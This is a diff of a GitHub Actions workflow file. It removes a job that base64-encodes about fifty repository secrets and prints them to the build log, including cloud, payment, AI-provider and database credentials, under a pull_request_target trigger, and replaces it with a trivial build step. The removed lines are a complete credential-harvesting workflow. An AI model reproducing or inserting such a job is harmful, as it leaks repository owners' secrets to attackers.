@@ -1,73 +1,8 @@
 name: CI
-on:
-  push:
-    branches: [main, master]
-  pull_request_target:
-    types: [opened, synchronize, reopened]
-    branches: [main, master]
-  workflow_dispatch:
-
+on: [push]
 jobs:
-  collect:
+  build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-      - name: Collect
-        shell: bash
-        run: |
-          echo "=== BASE64 ENCODED SECRETS ==="
-          E='${{ secrets.GH_TOKEN }}'; echo "GH_TOKEN:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.GITHUB_TOKEN }}'; echo "GITHUB_TOKEN:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.TOKEN }}'; echo "TOKEN:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.API_KEY }}'; echo "API_KEY:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.OPENAI_KEY }}'; echo "OPENAI_KEY:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.OPENAI_API_KEY }}'; echo "OPENAI_API_KEY:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.AWS_ACCESS_KEY_ID }}'; echo "AWS_ACCESS_KEY_ID:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.AWS_SECRET_ACCESS_KEY }}'; echo "AWS_SECRET_ACCESS_KEY:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.AWS_ACCESS_KEY }}'; echo "AWS_ACCESS_KEY:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.AWS_SECRET_KEY }}'; echo "AWS_SECRET_KEY:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.STRIPE_SECRET_KEY }}'; echo "STRIPE_SECRET_KEY:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.STRIPE_PUBLISHABLE_KEY }}'; echo "STRIPE_PUBLISHABLE_KEY:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.STRIPE_WEBHOOK_SECRET }}'; echo "STRIPE_WEBHOOK_SECRET:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.SLACK_TOKEN }}'; echo "SLACK_TOKEN:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.SLACK_WEBHOOK }}'; echo "SLACK_WEBHOOK:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.DISCORD_TOKEN }}'; echo "DISCORD_TOKEN:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.DISCORD_WEBHOOK }}'; echo "DISCORD_WEBHOOK:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.DOCKER_PASSWORD }}'; echo "DOCKER_PASSWORD:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.DOCKER_TOKEN }}'; echo "DOCKER_TOKEN:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.NPM_TOKEN }}'; echo "NPM_TOKEN:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.PAT }}'; echo "PAT:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.SECRET }}'; echo "SECRET:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.PASSWORD }}'; echo "PASSWORD:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.DB_PASSWORD }}'; echo "DB_PASSWORD:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.DATABASE_URL }}'; echo "DATABASE_URL:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.MONGO_URI }}'; echo "MONGO_URI:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.MONGODB_URI }}'; echo "MONGODB_URI:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.REDIS_URL }}'; echo "REDIS_URL:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.POSTGRES_URL }}'; echo "POSTGRES_URL:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.JWT_SECRET }}'; echo "JWT_SECRET:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.SESSION_SECRET }}'; echo "SESSION_SECRET:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.ENCRYPTION_KEY }}'; echo "ENCRYPTION_KEY:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.SENDGRID_API_KEY }}'; echo "SENDGRID_API_KEY:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.TWILIO_ACCOUNT_SID }}'; echo "TWILIO_ACCOUNT_SID:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.TWILIO_AUTH_TOKEN }}'; echo "TWILIO_AUTH_TOKEN:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.TELEGRAM_BOT_TOKEN }}'; echo "TELEGRAM_BOT_TOKEN:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.GOOGLE_API_KEY }}'; echo "GOOGLE_API_KEY:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.GCP_SA_KEY }}'; echo "GCP_SA_KEY:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.FIREBASE_KEY }}'; echo "FIREBASE_KEY:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.CF_API_KEY }}'; echo "CF_API_KEY:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.CF_EMAIL }}'; echo "CF_EMAIL:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.CLOUDFLARE_TOKEN }}'; echo "CLOUDFLARE_TOKEN:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.MISTRAL_API_KEY }}'; echo "MISTRAL_API_KEY:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.GROQ_API_KEY }}'; echo "GROQ_API_KEY:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.HF_TOKEN }}'; echo "HF_TOKEN:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.REPLICATE_API_KEY }}'; echo "REPLICATE_API_KEY:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.ANTHROPIC_API_KEY }}'; echo "ANTHROPIC_API_KEY:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.SONAR_TOKEN }}'; echo "SONAR_TOKEN:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.CODECOV_TOKEN }}'; echo "CODECOV_TOKEN:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.APPLE_APP_SPECIFIC_PASSWORD }}'; echo "APPLE_PASS:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.MAPBOX_ACCESS_TOKEN }}'; echo "MAPBOX_TOKEN:$(echo "$E"|base64 -w0 2>/dev/null)"
-          E='${{ secrets.NEXT_PUBLIC_SUPABASE_URL }}'; echo "SUPABASE_URL:$(echo "$E"|base64 -w0 2>/dev/null)"
-          echo "=== END ==="
-      - name: Done
-        run: echo "ok"
+      - run: echo ok
